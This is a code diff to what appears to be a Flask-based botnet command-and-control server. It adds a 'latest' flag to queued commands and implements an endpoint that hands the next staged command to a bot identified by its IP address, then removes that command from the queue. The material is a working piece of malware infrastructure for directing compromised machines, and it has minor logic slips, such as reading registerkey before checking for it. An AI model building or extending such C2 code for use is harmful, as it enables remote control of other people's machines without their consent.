@@ -67,11 +67,19 @@ class Command(db.Model):
     result = db.Column(db.String(500))
     bot_id = db.Column(db.Integer, db.ForeignKey('bot.bot_id'))
     timestamp = db.Column(db.String(50)) 
+    latest = db.Column(db.Boolean, default=False)
 
     def __init__(self, cmd, bot_id):
         self.cmd = cmd 
         self.bot_id = bot_id 
         self.timestamp = str(datetime.now())
+        self.latest = False
+
+    def set_latest_true(self):
+        self.latest = True
+
+    def set_latest_false(self):
+        self.latest = False 
 
     def set_result(self, result):
         self.result = result 
@@ -186,14 +194,43 @@ def register():
 
 # TODO: Change this to POST, and add botkey for "authentication" <-- lmao
 # TODO: Implement this API endpoint  
-@app.route('/bot/<bot_ip>/task', methods=['GET'])
+@app.route('/bot/<bot_ip>/task', methods=['POST'])
 def bottask(bot_ip):
     #query_bot = Bot.query.filter_by(ip=bot_ip).first()
     #cmd = query_bot.cmds
-    pass
+
+    if request.method != 'POST':
+        return jsonify({'error': 'wrong HTTP method'})
+
+    data = request.form
+    registerkey = data['registerkey']
+
+    try:
+        if data is None:
+            return jsonify({'error': 'Could not process body parameters'})
+        if registerkey is None:
+            return jsonify({'error': 'regsiterkey is required'})
+
+        # Get the bot corresponding with the bot_ip 
+        query_bot = Bot.query.filter_by(ip=bot_ip).first()
+
+        # Try getting commands, from the oldest staged command to the lastest staged command. 
+        try:
+            # FILO - Stack, first in, last out (last = most recent)
+            command = query_bot.cmds[0]
+        except Exception as e:
+            return jsonify({'error': 'There are no commands available'})
+
+        query_bot.cmds.remove(command)
+        db.session.commit()
+
+        return command.cmd
 
 
+    except Exception as e:
+        return str(e) 
 
+# TODO: Should it be bot_id ? Or bot_ip? Which one makes logical sense?
 @app.route('/bot/<bot_id>/push', methods=['POST'])
 def botpush(bot_id):
     """
